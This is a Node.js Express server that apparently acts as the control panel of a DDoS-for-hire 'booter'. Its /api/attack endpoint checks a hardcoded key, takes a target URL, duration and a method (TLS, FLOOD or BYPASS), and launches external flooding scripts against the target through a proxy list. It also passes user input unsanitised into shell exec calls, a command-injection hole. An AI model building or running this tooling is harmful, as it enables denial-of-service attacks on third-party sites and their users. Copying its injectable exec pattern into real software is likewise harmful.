const express = require('express');
const app = express();
const port = 3000;
const exec = require('child_process').exec;

app.get('/api/attack', (req, res) => {
  const key = req.query.key;  
  const url = req.query.url;
  const attackPort = req.query.port;
  const time = req.query.time;
  const method = req.query.method;
  
  if (!key || !url || !attackPort || !time || !method) {
    const err_u = {
      message: 'Invalid request parameters',
      code: '400'
    };
    res.status(400).send(err_u);
  } else {
    if (key === 'phong') {
      if (url) {
        if (time <= 120) {
          if (method === 'TLS' || method === 'FLOOD' || method === 'BYPASS') {
            const jsonData = {
              error: false,
              status: 'Attack sent successfully to all Phong servers',
              url: url,
              port: attackPort,
              time: time,
              method: method,
            };
            res.status(200).send(jsonData);

            if (method === 'TLS') {
              exec(`node killer.js ${url} ${time} 64 5 proxy.txt`, (error, stdout, stderr) => {  
                console.log('TLS is running');
              });
            }
            
            if (method === 'FLOOD') {
              exec(`node flooder.js ${url} ${time} 64 6 proxy.txt`, (error, stdout, stderr) => {  
                console.log('flood is running');
              });
            }
            
            if (method === 'BYPASS') {
              exec(`node bypass.js ${url} ${time} 64 7 proxy.txt`, (error, stdout, stderr) => {  
                console.log('bypass is running');
              });
            }
          } else {
            const err_method = {
              message: 'Invalid attack method',
              code: '400'
            };
            res.status(400).send(err_method);
          }
        } else {
          const err_time = {
            message: 'Invalid attack time',
            code: '400'
          };
          res.status(400).send(err_time);
        }
      } else {
        const err_url = {
          message: 'Invalid URL',
          code: '400'
        };
        res.status(400).send(err_url);
      }
    } else {
      const err_key = {
        message: 'Invalid key',
        code: '400'
      };
      res.status(400).send(err_key);
    }
  }
});

app.listen(port, () => {
  console.log(`Server running on port http://localhost:${port}`);
});